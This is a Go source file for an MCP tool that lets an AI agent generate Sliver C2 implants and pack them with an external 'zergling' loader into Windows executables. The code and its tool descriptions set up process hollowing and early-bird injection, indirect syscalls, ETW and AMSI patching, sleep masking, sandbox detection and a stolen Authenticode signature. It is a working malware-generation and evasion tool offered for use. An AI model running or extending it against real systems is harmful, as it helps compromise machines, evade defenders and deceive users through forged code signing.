package mcp

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	mcpapi "github.com/mark3labs/mcp-go/mcp"
)

const (
	generatePackedImplantToolName = "generate_zergling_implant"
)

type zerglingEvasion struct {
	CheckResources  bool `json:"check_resources"`
	UserInteraction bool `json:"user_interaction"`
	Numa            bool `json:"numa"`
	Noaccess        bool `json:"noaccess"`
}

type zerglingUAC struct {
	Enabled bool   `json:"enabled"`
	Method  string `json:"method"`
}

type zerglingShellcode struct {
	Source string `json:"source"`
	File   string `json:"file"`
}

type zerglingPost struct {
	UPX  bool `json:"upx"`
	Sign bool `json:"sign"`
}

type zerglingManifest struct {
	Method           string            `json:"method"`
	SyscallsIndirect bool              `json:"syscalls_indirect"`
	ETWPatch         bool              `json:"etw_patch"`
	AMSIPatch        bool              `json:"amsi_patch"`
	SleepMask        bool              `json:"sleep_mask"`
	Debug            bool              `json:"debug"`
	Evasion          zerglingEvasion   `json:"evasion"`
	UAC              zerglingUAC       `json:"uac"`
	Shellcode        zerglingShellcode `json:"shellcode"`
	Post             zerglingPost      `json:"post"`
	Output           string            `json:"output"`
}

type generatePackedImplantArgs struct {
	Name             string   `json:"name" jsonschema:"description=Name for the implant"`
	OS               string   `json:"os" jsonschema:"description=Target OS (windows/linux/darwin),required"`
	Arch             string   `json:"arch" jsonschema:"description=Target architecture (amd64/386/arm64),required"`
	IsBeacon         bool     `json:"is_beacon" jsonschema:"description=Generate as beacon"`
	BeaconInterval   int64    `json:"beacon_interval" jsonschema:"description=Beacon interval in nanoseconds"`
	BeaconJitter     int64    `json:"beacon_jitter" jsonschema:"description=Beacon jitter in nanoseconds"`
	C2URLs           []string `json:"c2_urls" jsonschema:"description=C2 URLs,required"`
	Format           int32    `json:"format" jsonschema:"description=Output format"`
	Debug            bool     `json:"debug" jsonschema:"description=Debug mode"`
	Evasion          bool     `json:"evasion" jsonschema:"description=Evasion features"`
	ObfuscateSymbols bool     `json:"obfuscate_symbols" jsonschema:"description=Obfuscate symbols"`
	IncludeMTLS      bool     `json:"include_mtls" jsonschema:"description=Include mTLS transport"`
	IncludeHTTP      bool     `json:"include_http" jsonschema:"description=Include HTTP transport"`
	IncludeWG        bool     `json:"include_wg" jsonschema:"description=Include WireGuard transport"`
	IncludeDNS       bool     `json:"include_dns" jsonschema:"description=Include DNS transport"`

	Method           string `json:"method" jsonschema:"description=Injection method. create_thread (default) runs shellcode in the loader process — if the loader dies (e.g. SSH disconnect) the implant dies too. early_bird or process_hollow inject into a new process and survive the loader exiting. Use early_bird/process_hollow for unattended or remote-launch scenarios."`
	SyscallsIndirect bool   `json:"syscalls_indirect" jsonschema:"description=Use indirect syscalls (recommended always)"`
	ETWPatch         bool   `json:"etw_patch" jsonschema:"description=Patch ETW"`
	AMSIPatch        bool   `json:"amsi_patch" jsonschema:"description=Patch AMSI"`
	SleepMask        bool   `json:"sleep_mask" jsonschema:"description=Enable sleep masking (ChaCha20 encryption during beacon sleep)"`
	EvasionNoaccess  bool   `json:"evasion_noaccess" jsonschema:"description=PAGE_NOACCESS dwell before shellcode execution"`
	EvasionResources bool   `json:"evasion_resources" jsonschema:"description=Check resource count to detect sandbox"`
	UPX              bool   `json:"upx" jsonschema:"description=Compress with UPX"`
	Sign             bool   `json:"sign" jsonschema:"description=Append stolen Authenticode signature"`
	ManifestJSON     string `json:"manifest_json" jsonschema:"description=Full zergling manifest JSON (overrides individual fields if provided)"`
	OutputDir        string `json:"output_dir" jsonschema:"description=Directory to save output file (default /tmp)"`
}

func (s *SliverMCPServer) generatePackedImplantHandler(ctx context.Context, request mcpapi.CallToolRequest) (*mcpapi.CallToolResult, error) {
	if s.Rpc == nil {
		return mcpapi.NewToolResultError("rpc client not configured"), nil
	}

	if s.ZerglingPath == "" {
		return mcpapi.NewToolResultError("zergling packer path not configured"), nil
	}

	var args generatePackedImplantArgs
	if err := request.BindArguments(&args); err != nil {
		return mcpapi.NewToolResultError(fmt.Sprintf("invalid arguments: %v", err)), nil
	}
	s.logToolCall(generatePackedImplantToolName, "", "")

	cfg := buildImplantConfig(args.OS, args.Arch, args.IsBeacon,
		args.BeaconInterval, args.BeaconJitter, args.C2URLs,
		args.Format, args.Debug, args.Evasion, args.ObfuscateSymbols,
		args.IncludeMTLS, args.IncludeHTTP, args.IncludeWG, args.IncludeDNS,
		"", 0, 0, "", "", "")

	genResp, err := s.Rpc.Generate(ctx, &clientpb.GenerateReq{
		Config: cfg,
		Name:   args.Name,
	})
	if err != nil {
		return mcpapi.NewToolResultErrorFromErr("implant generation failed", err), nil
	}
	if genResp.File == nil || len(genResp.File.Data) == 0 {
		return mcpapi.NewToolResultError("generation returned empty payload"), nil
	}

	scFile, err := os.CreateTemp("", "sliver-sc-*.bin")
	if err != nil {
		return mcpapi.NewToolResultErrorFromErr("failed to create temp file", err), nil
	}
	scPath := scFile.Name()
	defer os.Remove(scPath)

	if _, err := scFile.Write(genResp.File.Data); err != nil {
		scFile.Close()
		return mcpapi.NewToolResultErrorFromErr("failed to write shellcode", err), nil
	}
	scFile.Close()

	outDir := args.OutputDir
	if outDir == "" {
		outDir = os.TempDir()
	}
	outPath := filepath.Join(outDir, genResp.ImplantName+".exe")

	var manifest zerglingManifest
	if args.ManifestJSON != "" {
		if err := json.Unmarshal([]byte(args.ManifestJSON), &manifest); err != nil {
			return mcpapi.NewToolResultError(fmt.Sprintf("invalid manifest JSON: %v", err)), nil
		}
	} else {
		method := args.Method
		if method == "" {
			method = "create_thread"
		}
		manifest = zerglingManifest{
			Method:           method,
			SyscallsIndirect: args.SyscallsIndirect,
			ETWPatch:         args.ETWPatch,
			AMSIPatch:        args.AMSIPatch,
			SleepMask:        args.SleepMask,
			Debug:            args.Debug,
			Evasion: zerglingEvasion{
				CheckResources: args.EvasionResources,
				Noaccess:       args.EvasionNoaccess,
			},
			UAC: zerglingUAC{
				Enabled: false,
				Method:  "auto",
			},
			Post: zerglingPost{
				UPX:  args.UPX,
				Sign: args.Sign,
			},
		}
	}

	manifest.Shellcode = zerglingShellcode{
		Source: "file",
		File:   scPath,
	}
	manifest.Output = outPath

	manifestFile, err := os.CreateTemp("", "zergling-manifest-*.json")
	if err != nil {
		return mcpapi.NewToolResultErrorFromErr("failed to create manifest file", err), nil
	}
	manifestPath := manifestFile.Name()
	defer os.Remove(manifestPath)

	manifestBytes, err := json.MarshalIndent(manifest, "", "  ")
	if err != nil {
		manifestFile.Close()
		return mcpapi.NewToolResultErrorFromErr("failed to marshal manifest", err), nil
	}
	if _, err := manifestFile.Write(manifestBytes); err != nil {
		manifestFile.Close()
		return mcpapi.NewToolResultErrorFromErr("failed to write manifest", err), nil
	}
	manifestFile.Close()

	cmd := exec.CommandContext(ctx, s.ZerglingPath, "build", "-c", manifestPath)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return mcpapi.NewToolResultError(fmt.Sprintf("zergling build failed: %v\n%s", err, string(output))), nil
	}

	info, err := os.Stat(outPath)
	if err != nil {
		return mcpapi.NewToolResultErrorFromErr("failed to stat packed output", err), nil
	}

	type packedResult struct {
		ImplantName string `json:"implant_name"`
		Size        int    `json:"size"`
		PackedSize  int64  `json:"packed_size"`
		Method      string `json:"method"`
		BuildOutput string `json:"build_output"`
		OutputPath  string `json:"output_path"`
	}

	return mcpapi.NewToolResultStructuredOnly(packedResult{
		ImplantName: genResp.ImplantName,
		Size:        len(genResp.File.Data),
		PackedSize:  info.Size(),
		Method:      manifest.Method,
		BuildOutput: string(output),
		OutputPath:  outPath,
	}), nil
}
